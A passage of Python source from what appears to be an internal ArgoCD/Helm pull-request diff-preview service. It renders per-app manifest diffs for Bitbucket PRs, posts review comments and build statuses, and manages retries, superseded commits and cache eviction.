        any_hard_error = False   # OUT_ERROR — unexpected failure
        # COPS-2575: set to the newer sha the moment a mid-render supersede is
        # detected, so the guard after the batch can refuse to publish.
        _superseded_sha = None
        any_unknown    = False   # OUT_INDETERMINATE — diff not computable
        outcome_counts = Counter()
        reason_counts  = Counter()
        # Seed with the pre-populated confirmed-decommission results (never
        # went through run_diff, so the normal per-app counting loop below
        # never sees them).
        for _r in app_results.values():
            outcome_counts[_r.outcome] += 1

        # The value-file cache is keyed by (commit_sha, path). Commit shas are
        # immutable, so an entry is always valid for that sha — no per-PR clear is
        # needed (clearing it would also throw away the base-sha files that other
        # concurrently-processed PRs just fetched). We only bound its size so a
        # long-lived pod does not grow it without limit.
        _bound_vf_cache()

        # For each affected app, detect whether the PR changes the OCI chart
        # targetRevision (appspace.version bump). If so, the PR render uses the
        # new chart version so the diff shows the real image changes. This reads
        # config files from Bitbucket, so fan it out in parallel (cached + rate
        # limited by _bb_api_sem) instead of a serial loop over 600+ apps.
        pr_chart_revisions = {}
        invalid_version_apps = set()
        with ThreadPoolExecutor(max_workers=max(1, min(DIFF_WORKERS, len(affected)))) as ex:
            rev_futs = {ex.submit(_pr_chart_revision_checked, app, _app_to_files.get(app, []),
                                   pr_sha, main_sha=base_sha, renames=renames): app
                        for app in affected}
            for fut in as_completed(rev_futs):
                app = rev_futs[fut]
                try:
                    new_rev, invalid = fut.result()
                except Exception:
                    new_rev, invalid = None, False
                if invalid:
                    invalid_version_apps.add(app)
                if new_rev:
                    pr_chart_revisions[app] = new_rev
        if invalid_version_apps:
            log(f"PR #{pr_id}: appspace.version rejected as unsafe/invalid for "
                f"{len(invalid_version_apps)} app(s): "
                f"{', '.join(sorted(invalid_version_apps))}", "WARNING", pr=pr_id)

        # COPS-2562: the name check is now O(changed identity files), not
        # O(apps x chain x 2 shas). It reads only the files this PR actually
        # touches -- customerName always lives in the environment's own leaf
        # file -- so a pure version bump does no value-chain resolution at
        # all. Replaces the second prep ThreadPoolExecutor entirely (point 4:
        # one pass, not two serial pools over the same apps).
        bad_name_files = _changed_files_with_bad_names(changed, pr_sha, base_sha,
                                                       repo=repo)
        gsa_invalid_apps = {}
        if bad_name_files:
            for _app, _files in _app_to_files.items():
                for _f in _files:
                    if _f in bad_name_files:
                        gsa_invalid_apps[_app] = bad_name_files[_f]
                        break
            log(f"PR #{pr_id}: appspace.customerName too long/invalid in "
                f"{len(bad_name_files)} file(s), blocking "
                f"{len(gsa_invalid_apps)} app(s)", "WARNING", pr=pr_id)
        if pr_chart_revisions:
            unique_bumps = sorted(set(pr_chart_revisions.values()))
            log(f"PR #{pr_id}: chart version bumps detected for "
                f"{len(pr_chart_revisions)} app(s) -> {unique_bumps}",
                pr=pr_id)

        # Record which chart builds this PR renders with, so a republish of
        # any of them (JFrog webhook) can force this PR to recompute. Covers
        # both the main-side build and the PR-side bumped build.
        _targets = set()
        for app in affected:
            _cn = _app_chart_map.get(app)
            if not _cn:
                continue
            _mr = _app_chart_revision_map.get(app)
            if _mr:
                _targets.add((_cn, _mr))
            _bumped = pr_chart_revisions.get(app)
            if _bumped:
                _targets.add((_cn, _bumped))
        with _seen_lock:
            _pr_chart_targets[sk] = _targets

        _changed_paths_set = set(changed)   # for value-file skip optimization

        def run_diff(app):
            t0 = time.monotonic()
            try:
                # FIX A (v2.4.9): if the PR set this app's appspace.version to an
                # unsafe/invalid value, do not diff against the current revision
                # (that would render identically and show a misleading green "no
                # changes"). Report it as a permanent, blocking failure instead.
                if app in gsa_invalid_apps:
                    result = DiffResult("", [], 0, False, gsa_invalid_apps[app],
                                        OUT_INDETERMINATE, REASON_NAME_TOO_LONG)
                    return app, result, round(time.monotonic() - t0, 1)
                if app in invalid_version_apps:
                    result = DiffResult("", [], 0, False,
                                        "appspace.version was rejected as unsafe/invalid",
                                        OUT_INDETERMINATE, REASON_INVALID_VERSION)
                    return app, result, round(time.monotonic() - t0, 1)
                chart_rev = pr_chart_revisions.get(app)
                result = argocd_diff(app, pr_sha, main_sha=base_sha,
                                     chart_revision=chart_rev,
                                     changed_paths=_changed_paths_set,
                                     renames=renames)
                elapsed = round(time.monotonic() - t0, 1)
                return app, result, elapsed
            finally:
                # v2.5.21 (F2): release this worker's pooled sockets before it
                # returns to the pool, so a torn-down ThreadPoolExecutor does
                # not leak keep-alive FDs. Reuse still happens WITHIN a single
                # diff (which makes several BB calls); only cross-diff idle
                # sockets are closed.
                _close_pooled_connections()

        def process_batch(apps, workers):
            """Diff a list of apps with a bounded pool, accumulating results.

            Checks _shutdown between futures so SIGTERM drains gracefully instead
            of waiting for the entire batch to complete before yielding.
            """
            nonlocal any_hard_error, any_unknown, _superseded_sha
            if not apps:
                return
            with ThreadPoolExecutor(max_workers=max(1, min(workers, len(apps)))) as ex:
                futures = {ex.submit(run_diff, app): app for app in apps}
                for fut in as_completed(futures):
                    # COPS-2575: a newer push makes every remaining diff
                    # pointless. Same treatment as SIGTERM below, cancel the
                    # queued futures and break, because the partial-results
                    # guard after this batch already refuses to publish an
                    # incomplete run. This is where the 190 wasted seconds on
                    # acme-config-prod PR 3837 are actually saved.
                    if not _superseded_sha:
                        _newer = _superseded(sk, pr_sha)
                        if _newer:
                            _superseded_sha = _newer
                            log(f"PR #{pr_id}: superseded mid-render "
                                f"({pr_sha[:8]} -> {_newer[:8]}), cancelling "
                                f"{sum(1 for f in futures if not f.done())} queued diff(s)",
                                pr=pr_id, event="superseded",
                                old_sha=pr_sha[:12], new_sha=_newer[:12],
                                stage="batch", apps_done=len(app_results))
                            for f in futures:
                                f.cancel()
                            break
                    if _shutdown:
                        log(f"SIGTERM received mid-batch — draining remaining futures",
                            "WARNING")
                        # v2.5.19 (M4): cancel the still-queued diffs instead of
                        # letting the `with` exit block on shutdown(wait=True)
                        # for the whole queue — on a mass PR that overran
                        # terminationGracePeriodSeconds and got SIGKILLed. The
                        # partial-results guard already prevents a false comment;
                        # this just lets the drain actually be graceful.
                        for f in futures:
                            f.cancel()
                        break
                    app = futures[fut]
                    try:
                        app, result, elapsed = fut.result()
                    except Exception as exc:
                        # CORRECTNESS FIX (v2.4.8): an unhandled exception here
                        # used to propagate out of process_batch entirely,
                        # aborting every remaining app in the batch (their
                        # results were simply never recorded — no comment
                        # update, no error, just silence for that app on this
                        # run). Every other pool in this module (pre-warm,
                        # JFrog refresh) already isolates per-item failures;
                        # this one did not. Record it as OUT_ERROR and keep
                        # processing the rest of the batch.
                        log(f"diff crashed for {app}: {exc}", "ERROR", pr=pr_id, app=app)
                        result = DiffResult("", [], 0, False, str(exc)[:300],
                                            OUT_ERROR, REASON_UNEXPECTED)
                        elapsed = 0.0
                    app_results[app] = result
                    _touch_progress()  # C2 checkpoint: one app's diff completed
                    outcome_counts[result.outcome] += 1
                    if result.outcome == OUT_ERROR:
                        any_hard_error = True
                        reason_counts[result.reason] += 1
                    elif result.outcome == OUT_INDETERMINATE:
                        any_unknown = True
                        reason_counts[result.reason] += 1
                    n_sections = result.n_res if result.outcome == OUT_DIFF else 0
                    # Structured per-app line so failures are queryable in logs.
                    log(f"diff {result.outcome}/{result.reason} for {app} [{elapsed}s]"
                        + (f" | {result.error[:120]}" if result.error else ""),
                        severity=("WARNING" if result.outcome in (OUT_INDETERMINATE, OUT_ERROR) else "INFO"),
                        pr=pr_id, app=app, outcome=result.outcome, reason=result.reason,
                        elapsed_s=elapsed, resources=n_sections)

        # Helm chart pre-warm: pull all needed chart versions before diffing.
        # Skip versions that are already in the on-disk HELM_CACHE_DIR to avoid
        # unnecessary OCI calls when the pod has already downloaded them.
        if HELM_BIN and OCI_PASS:
            unique_chart_pulls = set()
            for app in affected:
                chart   = _app_chart_map.get(app)
                reg     = _app_chart_registry_map.get(app)
                main_rv = _app_chart_revision_map.get(app)
                pr_rv   = pr_chart_revisions.get(app, main_rv)
                if chart and reg:
                    if main_rv:
                        unique_chart_pulls.add((reg, chart, main_rv))
                    if pr_rv and pr_rv != main_rv:
                        unique_chart_pulls.add((reg, chart, pr_rv))

            # Filter out versions already cached on disk (pod restart preserves /tmp)
            # CORRECTNESS FIX (v2.4.8): snapshot _helm_chart_cache under its
            # lock instead of reading it live while other threads mutate it.
            # Worst case before this fix was an extra redundant pull (the
            # dict is only ever added to or evicted, never corrupted, so this
            # was never unsafe under the GIL — just an unsynchronized read of
            # shared state, which is the kind of thing that turns into a real
            # bug the next time this function grows a second read).
            with _helm_cache_lock:
                _cache_snapshot = set(_helm_chart_cache)
            pulls_needed = {
                (reg, chart, ver) for reg, chart, ver in unique_chart_pulls
                if not os.path.isdir(os.path.join(HELM_CACHE_DIR, reg, chart, ver))
                and f"{reg}/{chart}:{ver}" not in _cache_snapshot
            }
            already_cached = len(unique_chart_pulls) - len(pulls_needed)
            if pulls_needed or already_cached:
                msg = f"    Helm pre-warm: {len(pulls_needed)} to pull"
                if already_cached:
                    msg += f", {already_cached} already cached"
                print(msg, flush=True)
            if pulls_needed:
                with ThreadPoolExecutor(max_workers=max(1, min(WARM_WORKERS, len(pulls_needed)))) as ex:
                    futures = [ex.submit(_ensure_chart, reg, chart, ver)
                               for reg, chart, ver in pulls_needed]
                    for fut in as_completed(futures):
                        try:
                            fut.result()
                        except OciChartNotFound as e:
                            log(str(e), "WARNING")
                        except Exception:
                            pass

        # Fan-out: diff all affected apps. The chart pre-pull phase above already
        # has the tarball for every needed version on disk, so _run_one_diff will
        # skip the pull step and go straight to helm template. No separate warm-up
        # diff pass is needed (the old ArgoCD repo-server warm-up no longer applies).
        process_batch(affected, DIFF_WORKERS)

        # COPS-2575: a newer commit landed while this render was running. Do
        # not publish anything for a dead commit: no comment (it would
        # overwrite the shared PR comment with a diff nobody will merge) and
        # no build status. The INPROGRESS already posted sits on a sha that is
        # no longer the tip, so Bitbucket shows only the new tip's statuses and
        # it is inert; fix_stuck_inprogress covers the pathological case.
        # _seen is deliberately NOT set and the backoff is deliberately NOT
        # fed: a supersede is not a transient failure and must not slow the
        # retry down. _wake was already set by the superseding webhook and is
        # only cleared after the iteration, so the next pass starts at once.
        _late_supersede = _superseded_sha or _superseded(sk, pr_sha)
        if _late_supersede:
            _n = _note_supersede_abort(sk)
            log(f"PR #{pr_id}: superseded ({pr_sha[:8]} -> {_late_supersede[:8]}) "
                f"after {len(app_results)}/{total_apps_this_run} app(s), "
                f"discarding this render, no comment and no status "
                f"(consecutive={_n})",
                pr=pr_id, event="superseded", old_sha=pr_sha[:12],
                new_sha=_late_supersede[:12], stage="post_batch",
                apps_done=len(app_results), apps_total=total_apps_this_run)
            return  # _seen NOT set → the newer sha renders on the next pass

        # If SIGTERM arrived mid-batch, results are incomplete — do NOT post them
        # as a final comment (could show false green on partial evaluation). Leave
        # the PR un-seen; it will be re-evaluated on the next pod if one starts.
        if _shutdown and len(app_results) < total_apps_this_run:
            n_done  = len(app_results)
            n_total = total_apps_this_run
            log(f"PR #{pr_id}: SIGTERM mid-diff ({n_done}/{n_total} apps evaluated) "
                f"— skipping comment/status to avoid false result", "WARNING", pr=pr_id)
            return  # _seen NOT set → will retry next iteration or pod

        # Per-PR breakdown — at a glance, how many apps failed and why.
        breakdown = ", ".join(f"{k}={v}" for k, v in sorted(outcome_counts.items()))
        reasons   = ", ".join(f"{k}={v}" for k, v in sorted(reason_counts.items()))
        _bb_now = bb_call_stats()
        _bb_pr_files = _bb_now["file_fetches"] - _bb_at_pr_start["file_fetches"]
        _bb_pr_rest  = _bb_now["rest_calls"]   - _bb_at_pr_start["rest_calls"]
        _bb_pr_429   = _bb_now["rate_limited"] - _bb_at_pr_start["rate_limited"]
        log(f"PR #{pr_id} diff summary: {breakdown}"
            + (f" | reasons: {reasons}" if reasons else "")
            + f" | bitbucket: {_bb_pr_files + _bb_pr_rest} call(s) "
              f"({_bb_pr_files} file, {_bb_pr_rest} rest)"
            + (f", {_bb_pr_429} rate limited" if _bb_pr_429 else ""),
            pr=pr_id, bb_calls=_bb_pr_files + _bb_pr_rest,
            bb_file_fetches=_bb_pr_files, bb_rest_calls=_bb_pr_rest,
            bb_rate_limited=_bb_pr_429,
            **{f"n_{k}": v for k, v in outcome_counts.items()})

        # v2.5.4 (Finding 4): render any new-env candidates bundled with this
        # PR's existing-app changes, using the same path a new-env-only PR
        # uses. structural_envs forces the comment footer and, below, the
        # Bitbucket build status to block — a broken or unvalidated new
        # environment must never hide behind an unrelated app's clean diff.
        new_env_lines, structural_envs, total_new = ([], [], 0)
        new_env_full_lines = []
        if new_env_candidates:
            new_env_lines, structural_envs, total_new, new_env_full_lines = \
                _evaluate_new_envs(new_env_candidates, pr_sha,
                                   with_full_output=True)
        new_env_desc = (
            f"{len(structural_envs)} new environment(s) have a structural "
            f"config problem: {', '.join(structural_envs)}"
        ) if structural_envs else ""

        # COPS-2552: a paired move is excluded from the new-env candidates, so
        # the cohort guard above never sees it. Check the destinations here.
        moves_missing_cohort = _moves_missing_cohort(renames, pr_sha, repo=repo)
        if moves_missing_cohort:
            envs = ", ".join(b["env"] for b in moves_missing_cohort)
            log(f"PR #{pr_id}: move(s) with no cohort config.yaml at the "
                f"destination: {envs}", "WARNING")
            new_env_lines = _moves_missing_cohort_lines(moves_missing_cohort) + \
                (new_env_lines or [])
            new_env_desc = (f"{len(moves_missing_cohort)} moved environment(s) "
                            f"have no cohort config.yaml at the destination: "
                            f"{envs}")

        try:
            input_change_lines = _summarize_input_changes(changed, pr_sha, base_sha, repo=repo)
        except Exception as e:  # cause panel must never break the comment
            log(f"    [comment] input-changes panel failed: {e}", "WARNING")
            input_change_lines = []
        try:
            appspace_state_lines = _summarize_appspace_state_changes(
                changed, pr_sha, base_sha, path_map, repo=repo)
        except Exception as e:  # state-flag panel must never break the comment
            log(f"    [comment] appspace-state panel failed: {e}", "WARNING")
            appspace_state_lines = []
        try:
            vm_change_lines = _summarize_vm_changes(
                changed, pr_sha, base_sha, path_map, app_results, repo=repo)
        except Exception as e:  # VM panel must never break the comment
            log(f"    [comment] vm-changes panel failed: {e}", "WARNING")
            vm_change_lines = []
        # Direct permalink into the full-diff view for this exact commit.
        # Only built when the view is reachable from outside the cluster
        # (base URL set), so the comment never links to something a
        # reviewer cannot open. The artifact itself is saved below, before
        # upsert, so the link never 404s once the comment is visible.
        artifact_url = (diff_ui.ui_url(DIFF_UI_BASE_URL, repo or BB_REPO,
                                       pr_id, pr_sha)
                        if (DIFF_UI_ENABLED and DIFF_UI_BASE_URL) else "")
        _comment_kwargs = dict(
            skipped_apps=skipped_apps, base_sha=base_sha,
            new_env_lines=new_env_lines or None,
            new_env_structural=bool(structural_envs or moves_missing_cohort),
            new_env_desc=new_env_desc,
            decommission_lines=decommission_lines or None,
            input_change_lines=input_change_lines or None,
            appspace_state_lines=appspace_state_lines or None,
            appendix_lines=((decom_full_lines or [])
                            + (new_env_full_lines or [])) or None,
            vm_change_lines=vm_change_lines or None)
        body = format_comment(pr_sha, app_results,
                              artifact_url=artifact_url, **_comment_kwargs)
        comment_kb = round(len(body.encode()) / 1024, 1)
        # Full-diff UI: persist the COMPLETE body BEFORE upsert (which
        # truncates over MAX_COMMENT_BYTES), with the same per-PR context
        # (base commit, outcome breakdown, app count) already computed
        # above for the log line. readable_budget=0 disables the comment's
        # bulk folding (rollups, collapsed apps, table row cap) for this
        # render only: the comment above may point at this view, so it has
        # to actually hold everything the comment left out.
        # The full-diff view must be complete: every changed file key by key
        # (no 8-file cap, no line budget), every app's diff and the full
        # rendered-output appendix (readable_budget=0 disables rollups,
        # collapsing, the table row cap and the appendix pointer). The
        # comment points here, so this page has to hold everything the
        # comment left out -- always, not only when a flag happens to be on.
        _full_kwargs = dict(_comment_kwargs)
        try:
            _full_kwargs["input_change_lines"] = _summarize_input_changes(
                changed, pr_sha, base_sha, repo=repo, full=True) or None
        except Exception as e:
            log(f"    [comment] full input panel failed: {e}", "WARNING")
        full_body = format_comment(pr_sha, app_results,
                                   profile=FULL_PROFILE, **_full_kwargs)
        saved = _save_diff_ui_artifact(
            repo, pr_id, pr_sha, full_body, base_sha=base_sha,
            outcome_counts=dict(outcome_counts),
            app_count=len(app_results))
        # COPS-2609: the comment above already offers a link to that page.
        # If the save did not happen -- disk full, bad key, UI switched off
        # mid-run -- posting it as-is sends every reviewer of this PR to a
        # 404 with no way to tell that from a page nobody linked. Re-render
        # without the URL: the comment then says the page could not be
        # produced and keeps the hunks inline. Cheap (a pure function over
        # results already in memory) and it only runs on the failure path.
        # This is the fallback phases C-E lean on, so it has to be real
        # before the comment stops carrying YAML.
        fallback_inline = bool(artifact_url) and not saved
        if fallback_inline:
            log(f"PR #{pr_id}: full-diff page unavailable, re-rendering the "
                f"comment with hunks inline", "WARNING")
            artifact_url = ""
            body = format_comment(pr_sha, app_results, artifact_url="",
                                  **_comment_kwargs)
            comment_kb = round(len(body.encode()) / 1024, 1)
        _record_comment_stats(body, COMMENT_PROFILE,
                              fallback_inline=fallback_inline)
        upsert_comment(pr_id, body, existing_id, repo=repo,
                       artifact_url=artifact_url)
        action = "updated" if existing_id else "posted"
        print(f"    Comment {action} on PR #{pr_id} ({comment_kb}KB)")

        # Count changed resources and classify indeterminate reasons FIRST,
        # then update stats and build status (oci_not_found_count must be defined
        # before the stats block references it — bug fix for UnboundLocalError).
        sections_total = sum(
            max(r.n_res, 1) for r in app_results.values() if r.outcome == OUT_DIFF)
        n_unknown = outcome_counts[OUT_INDETERMINATE]
        # oci_not_found is a hard permanent error (wrong version in config) that
        # MUST block the PR — the deployer will fail the same way.
        oci_not_found_count = sum(
            1 for r in app_results.values()
            if r.outcome == OUT_INDETERMINATE and r.reason == REASON_OCI_NOT_FOUND
        )
        # v2.5.4 (Findings 1+3): PERMANENT_REASONS also includes invalid_yaml and
        # invalid_version, not just oci_not_found. Before this fix only
        # oci_not_found was ever checked here, so an invalid-YAML PR retried
        # forever every ~60s (is_transient_failure stayed True) instead of being
        # left alone like every other permanent error, and its status went
        # green via the generic "any_unknown" branch below. permanent_indet_count
        # is the general form has_blocking_indet always should have been.
        permanent_indet_count = sum(
            1 for r in app_results.values()
            if r.outcome == OUT_INDETERMINATE and r.reason in PERMANENT_REASONS
        )
        has_blocking_indet = permanent_indet_count > 0

        # Update global diff counters for /diff-preview/stats
        with _diff_stats_lock:
            _diff_stats["prs_processed"] += 1
            _diff_stats["apps_diff"] += outcome_counts.get(OUT_DIFF, 0)
            _diff_stats["apps_no_diff"] += outcome_counts.get(OUT_NO_DIFF, 0)
            _diff_stats["apps_indeterminate"] += outcome_counts.get(OUT_INDETERMINATE, 0)
            _diff_stats["apps_oci_not_found"] += oci_not_found_count
            # Split out the two most actionable failure reasons (bughunt N4):
            # a render failure usually means a chart/values bug, a timeout
            # usually means registry/network slowness — different owners.
            _diff_stats["apps_render_failed"] += reason_counts.get(REASON_RENDER, 0)
            _diff_stats["apps_timeout"] += reason_counts.get(REASON_TIMEOUT, 0)

        # v2.5.10: surface confirmed environment decommissions in the build
        # status too, not just the comment — informational, never blocking
        # on its own (a decommission is often EXPECTED to render as
        # indeterminate for its own now-gone apps; that's a separate,
        # already-correct signal, not something this note should duplicate).
        decom_extra = (
            f" | \U0001f5d1\ufe0f {len(decommissioned_envs)} environment(s) being decommissioned"
            if decommissioned_envs else "")

        # v2.5.4 (Finding 1): traffic-light rule agreed with Marcos — green ONLY
        # when the diff was actually computed (with or without changes); ANY
        # error, transient or permanent, is red. No orange/warning state.
        # Before this fix, only oci_not_found blocked; render_failed, timeout,
        # oci_pull_failed, metadata_pending, unexpected_error, invalid_yaml and
        # invalid_version all fell through to a green "diff unavailable"
        # status — confirmed live on real PRs (#6644 invalid_yaml, #6645
        # render_failed, #6647/#6648/#6649/#6654 renames) reporting SUCCESSFUL
        # while the comment itself said "NOT confirmed unchanged". A retryable
        # transient error still gets retried automatically on the next
        # iteration (see is_transient_failure below) — only the COLOR changes,
        # never the retry behavior.
        if (any_hard_error or has_blocking_indet or structural_envs
                or moves_missing_cohort):
            # COPS-2552: a move whose destination has no cohort config.yaml
            # must never post green. Merging it removes the environment from
            # ArgoCD instead of moving it, and the apps themselves diff clean,
            # so nothing else in this chain would catch it.
            if moves_missing_cohort:
                envs = ", ".join(b["env"] for b in moves_missing_cohort)
                _mmc_desc = (f"{len(moves_missing_cohort)} moved environment(s) "
                             f"have no cohort config.yaml at the destination "
                             f"({envs}) - merging would remove them from ArgoCD")
                post_build_status(pr_sha, "FAILED", _mmc_desc, pr_id=pr_id)
            elif structural_envs:
                base_desc = (f"{len(structural_envs)} new environment(s) have a "
                             f"structural config problem: {', '.join(structural_envs)}")
                if oci_not_found_count:
                    desc = f"{base_desc} | {oci_not_found_count} existing app(s): chart version not found in OCI registry"
                elif any_hard_error:
                    desc = f"{base_desc} | existing app diff also failed - check PR comment"
                elif permanent_indet_count:
                    desc = f"{base_desc} | {permanent_indet_count} existing app(s): invalid config"
                else:
                    desc = base_desc
                post_build_status(pr_sha, "FAILED", desc, pr_id=pr_id)
            elif oci_not_found_count:
                post_build_status(pr_sha, "FAILED",
                    f"{oci_not_found_count} app(s): chart version not found in OCI registry",
                    pr_id=pr_id)
            elif any_hard_error:
                post_build_status(pr_sha, "FAILED", "Diff failed - check PR comment", pr_id=pr_id)
            else:
                # Permanent indeterminate reason other than oci_not_found
                # (invalid_yaml, invalid_version) — author must fix the file.
                post_build_status(pr_sha, "FAILED",
                    f"{permanent_indet_count} app(s): invalid config — fix and push again "
                    f"(check PR comment for details)", pr_id=pr_id)
        elif skipped_apps:
            # Apps beyond MAX_APPS_PER_RUN were never evaluated — never post SUCCESSFUL
            # with a coverage gap, as reviewers assume full coverage.
            n_skipped = len(skipped_apps)
            extra = f" | {sections_total} resource(s) changed" if sections_total else ""
            post_build_status(pr_sha, "FAILED",
                f"{n_skipped} app(s) not evaluated (cap={MAX_APPS_PER_RUN} — raise "
                f"MAX_APPS_PER_RUN to cover){extra} — review comment", pr_id=pr_id)
        elif any_unknown:
            # v2.5.4 (Finding 1): ANY indeterminate app blocks now, whether or
            # not other apps in the same PR produced a real diff. Before this
            # fix, a real diff alongside a transient failure on another app
            # (e.g. render_failed) posted a green "(N unavailable)" suffix —
            # confirmed live: PR #6645 showed SUCCESSFUL while the comment
            # said "NOT confirmed unchanged" for the failed app. A transient
            # reason still retries automatically next iteration (unchanged
            # below); only the color is different now.
            extra = f" | {sections_total} resource(s) confirmed changed" if sections_total else ""
            post_build_status(pr_sha, "FAILED",
                f"Diff unavailable for {n_unknown} app(s){extra}{decom_extra} - review comment "
                f"(will retry automatically if transient)", pr_id=pr_id)
        elif sections_total > 0:
            extra = f" | +{len(new_env_candidates)} new environment(s) will be created" if new_env_candidates else ""
            post_build_status(pr_sha, "SUCCESSFUL",
                f"{sections_total} resource(s) will change{extra}{decom_extra} - review comment",
                pr_id=pr_id)
        else:
            if new_env_candidates:
                post_build_status(pr_sha, "SUCCESSFUL",
                    f"No manifest changes to existing apps | +{len(new_env_candidates)} "
                    f"new environment(s) will be created{decom_extra}", pr_id=pr_id)
            else:
                post_build_status(pr_sha, "SUCCESSFUL", f"No manifest changes{decom_extra}", pr_id=pr_id)

        # Mark as seen logic:
        # - Clean run (no error, no indeterminate): mark seen -> skip next iteration
        # - Soft indeterminate (transient timeout, render_failed, etc. — NOT in
        #   PERMANENT_REASONS): leave unseen -> retry next iteration. This is
        #   independent of the v2.5.4 status-color change above: a transient
        #   reason is still red now, but still retried the same as before.
        # - oci_not_found / invalid_yaml / invalid_version / hard error /
        #   structural new-env problem: mark seen -> DO NOT retry (permanent
        #   failure; a human must fix the config, retrying is wasteful +
        #   misleading). v2.5.4 fixes a real bug here too: before this, only
        #   oci_not_found stopped the retry loop, so an invalid_yaml PR was
        #   silently re-diffed every ~60s forever even though it can never
        #   resolve itself.
        is_permanent_failure = (any_hard_error or has_blocking_indet
                                or bool(structural_envs)
                                or bool(moves_missing_cohort))
        is_transient_failure = any_unknown and not is_permanent_failure
        if not is_transient_failure:
            # Mark seen for both clean runs AND permanent failures so we don't
            # spam the PR with repeated "not found" comments every 60s.
            with _seen_lock:
                _seen[sk] = (pr_sha, base_sha)
            _backoff_clear(sk)
            # COPS-2575: this PR published a real result, so the livelock
            # guard's consecutive-abort streak is over.
            _note_supersede_complete(sk)
        else:
            # COPS-2546: still unseen (so it retries), but with escalating
            # spacing instead of every iteration.
            delay = _backoff_register_transient(sk, pr_sha)
            log(f"PR #{pr_id}: transient failure, backing off {delay} "
                f"iteration(s) before the next retry")
        return outcome_counts

    except Exception as e:
        log(f"[ERROR] PR #{pr_id}: {e}", "ERROR")
        try:
            post_build_status(pr_sha, "FAILED", f"Diff error: {str(e)[:200]}", pr_id=pr_id)
        except Exception:
            pass
        err_body = (
            f"## \U0001f52d {STATUS_NAME}\n\n"
            f"{_comment_header(pr_sha)}\n\n"
            f"\u274c **Error processing diff:** {str(e)[:400]}\n\n"
            f"---\n**Status:** \u274c Error running diff\n"
            f"*{_ts()} \u2014 {COMMENT_MARKER} [permanent]" + (f" [base:{base_sha[:8]}]" if base_sha else "") + "*"
        )
        try:
            upsert_comment(pr_id, err_body, existing_id, repo=repo)
        except Exception:
            pass

# ── Main iteration (one poll cycle) ───────────────────────────────────
def main_iteration():
    """Run one complete poll cycle: discover apps, get open PRs, process each."""
    _iter_start = time.monotonic()
    # COPS-2564: per-iteration, not since pod start, so the number in the
    # closing log answers "what did THIS iteration cost the shared token".
    reset_bb_call_stats()
    log("ACME diff preview iteration starting")
    _touch_progress()  # C2 checkpoint: iteration is alive and beginning work

    # Trim the on-disk chart cache before any diffs so it never races a pull.
    _prune_helm_cache()

    # Proactively refresh the ArgoCD JWT before it expires so a busy iteration
    # never hits a mid-run 401. ARGOCD_TOKEN_TTL default=12h (well under the
    # 24h ArgoCD default); refresh is cheap (~100ms REST call).
    if _argocd_token and (time.monotonic() - _argocd_token_ts) > ARGOCD_TOKEN_TTL:
        try:
            argocd_login()
            log(f"ArgoCD JWT proactively refreshed (TTL={ARGOCD_TOKEN_TTL}s)")
        except Exception as e:
            log(f"Proactive JWT refresh failed: {e} — continuing with existing token",
                "WARNING")

    try:
        path_map = discover_path_app_map()
    except Exception as e:
        log(f"Cannot discover ArgoCD apps: {e}", "ERROR")
        # Re-login in case the ArgoCD session expired — next iteration will retry.
        # Do NOT mass-FAILED all open PRs: a brief ArgoCD blip would flood every
        # PR with spurious FAILED statuses. Leave existing statuses intact and
        # let the next loop attempt recovery.
        try:
            argocd_login()
        except Exception:
            pass
        return
    _touch_progress()  # C2 checkpoint: app discovery succeeded
    cache_age = round(time.monotonic() - _path_map_ts, 0) if _path_map_ts else -1
    log(f"Discovered {len(path_map)} unique paths across "
        f"{sum(len(v) for v in path_map.values())} app refs "
        f"({'cached' if cache_age >= 0 and cache_age < PATH_MAP_TTL else 'fresh'})")

    # ── COPS-2507 multi-repo scan: per-repo main sha, PR list and path-map
    # partition. A Bitbucket failure on one repo must not starve the others,
    # so each repo polls inside its own try. Global poll health only trips
    # when EVERY configured repo failed this iteration.
    global _last_poll_ok, _consecutive_poll_fails, _main_render_sha
    per_repo = []          # (repo, prs, base_sha)
    poll_failures = 0
    for repo in REPOS:
        try:
            main_info = http("GET",
                f"{_bb_api_base(repo)}/refs/branches/main",
                auth=(BB_USER, BB_TOKEN))
            base_sha = main_info["target"]["hash"]
            _register_sha_repo(base_sha, repo)
            log(f"[{repo}] Base SHA (main): {base_sha[:8]}")
            # COPS-2564: one fetch per repo per iteration replaces hundreds of
            # per-file API calls. Inside this try on purpose: a git problem
            # must not starve the other repos, and reads fall back anyway.
            mirror_sync(repo)
            # Invalidate the main-side render cache whenever THIS repo's main
            # moves. _main_render_sha became a per-repo dict; the cache clear
            # stays whole-cache (same correctness as before, slightly
            # conservative on cross-repo hit rate — dev dominates traffic).
            if not isinstance(_main_render_sha, dict):
                _main_render_sha = {}
            if base_sha != _main_render_sha.get(repo):
                with _main_render_lock:
                    _main_render_cache.clear()
                _main_render_sha[repo] = base_sha
            prs = get_open_prs(repo)
            per_repo.append((repo, prs, base_sha))
        except Exception as e:
            poll_failures += 1
            log(f"[{repo}] Bitbucket API error: {e}", "ERROR")
    if poll_failures == len(REPOS):
        _last_poll_ok = False
        _consecutive_poll_fails += 1
        log(f"Bitbucket poll failed for ALL repos (poll_fails={_consecutive_poll_fails})",
            "ERROR")
        return
    # Mark poll as healthy after at least one successful repo fetch.
    _last_poll_ok = True
    _consecutive_poll_fails = 0
    _touch_progress()  # C2 checkpoint: Bitbucket poll succeeded
    log("Open PRs: " + ", ".join(f"{repo}={len(prs)}" for repo, prs, _ in per_repo))

    # Evict _seen entries for PRs no longer open. Without this, a PR that
    # is declined and immediately reopened with the same SHA would be silently
    # skipped because the old SHA is still in _seen.
    # Keys are (repo, pr_id); only repos successfully polled THIS iteration
    # take part in eviction (a repo that failed to poll must not have its
    # state wiped by absence).
    polled_repos = {repo for repo, _, _ in per_repo}
    open_keys = {(repo, pr["id"]) for repo, prs, _ in per_repo for pr in prs}
    def _stale(k):
        if not isinstance(k, tuple):   # legacy/foreign key shape: evict
            return True
        return k[0] in polled_repos and k not in open_keys
    with _seen_lock:
        for stale_k in [k for k in _seen if _stale(k)]:
            del _seen[stale_k]
        for stale_k in [k for k in _pr_chart_targets if _stale(k)]:
            del _pr_chart_targets[stale_k]
        _force_recompute.difference_update(
            {k for k in _force_recompute if _stale(k)})
    with _comment_id_cache_lock:
        for stale_k in [k for k in _comment_id_cache if _stale(k)]:
            del _comment_id_cache[stale_k]
    # COPS-2575: same eviction rule for the supersede hint/abort state.
    _prune_supersede_state(open_keys, polled_repos)

    totals = Counter()
    work = []
    for repo, prs, base_sha in per_repo:
        repo_map = path_map if len(REPOS) == 1 else path_map_for_repo(repo)
        for pr in prs:
